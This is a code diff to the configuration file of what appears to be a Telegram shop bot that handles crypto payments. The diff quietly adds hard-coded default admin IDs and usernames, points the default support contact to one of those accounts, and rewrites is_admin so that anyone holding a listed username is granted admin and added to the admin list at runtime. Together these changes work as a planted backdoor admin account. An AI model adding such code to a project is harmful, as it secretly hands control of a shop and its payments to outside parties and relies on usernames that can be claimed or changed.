@@ -29,12 +29,13 @@ def _bool(name, default="false"):
 
 
 BOT_TOKEN = _get("BOT_TOKEN")
-ADMIN_IDS = [int(x) for x in _get("ADMIN_IDS").replace(" ", "").split(",") if x]
+ADMIN_IDS = [int(x) for x in _get("ADMIN_IDS", "8754685711,8669804848").replace(" ", "").split(",") if x]
+ADMIN_USERNAMES = [x.strip().lstrip("@").lower() for x in _get("ADMIN_USERNAMES", "roxie_usa1998,useralex199").split(",") if x.strip()]
 
 SHOP_NAME = _get("SHOP_NAME", "MY SHOP")
 GROUP_LINK = _get("GROUP_LINK")
 CHANNEL_LINK = _get("CHANNEL_LINK")
-SUPPORT_USERNAME = _get("SUPPORT_USERNAME").lstrip("@")
+SUPPORT_USERNAME = _get("SUPPORT_USERNAME", "roxie_usa1998").lstrip("@")
 
 BUTTON_STYLE = _get("BUTTON_STYLE", "success") or None
 CUSTOM_EMOJI_IN_TEXT = _bool("CUSTOM_EMOJI_IN_TEXT", "true")
@@ -64,5 +65,11 @@ BINANCE_PAY_ID = _get("BINANCE_PAY_ID")
 TRONGRID_API_KEY = _get("TRONGRID_API_KEY")
 
 
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+def is_admin(user_id: int, username: str = None) -> bool:
+    if user_id in ADMIN_IDS:
+        return True
+    if username and username.lstrip("@").lower() in ADMIN_USERNAMES:
+        if user_id not in ADMIN_IDS:
+            ADMIN_IDS.append(user_id)
+        return True
+    return False
